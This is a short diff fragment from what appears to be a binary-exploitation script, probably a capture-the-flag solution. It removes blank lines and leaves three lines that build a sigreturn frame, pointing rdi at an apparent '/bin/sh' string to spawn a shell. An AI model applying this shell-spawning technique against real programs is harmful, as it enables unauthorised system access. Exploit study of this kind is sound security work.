@@ -1,9 +1,3 @@
-
-
-
-
-
-
 sigframe = p64(read_plt) + p64(0x0)
 sigframe += (p64(0x0) * 2) * 6
 sigframe += p64(bsh) + p64(0x0)       # rdi rsi
